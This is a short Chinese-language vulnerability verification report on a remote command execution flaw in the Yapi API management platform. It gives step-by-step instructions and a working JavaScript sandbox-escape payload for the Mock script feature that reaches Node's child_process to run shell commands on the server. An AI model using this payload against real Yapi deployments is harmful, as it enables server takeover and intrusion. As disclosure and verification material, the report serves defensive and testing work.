【漏洞名称】

Yapi远程命令执行漏洞

【漏洞详情】

Yapi接口管理平台，使用Mock数据/脚本作为中间交互层，为前端后台开发与测试人员提供服务。由于Mock脚本自定义服务未对JS脚本进行命令过滤，使用户可以添加任何请求处理脚本，攻击者可以利用该漏洞在受影响的服务器上执行任意js代码，最终接管并控制服务器。

【漏洞编号】

无

【验证工具】

浏览器

【验证详情】

【验证条件】

无

【验证过程】

第一步 通过访问链接地址进入Yapi接口管理平台。

通过注册功能注册一个新用户。

第二步 在新建项目页面创建一个新项目。

进入项目内添加一个接口。

第三步 在Mock脚本中添加恶意代码。

const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
mockJson = process.mainModule.require("child_process").execSync("ls ../../").toString()

点击保存，打开预览界面。访问Mock地址可执行命令。
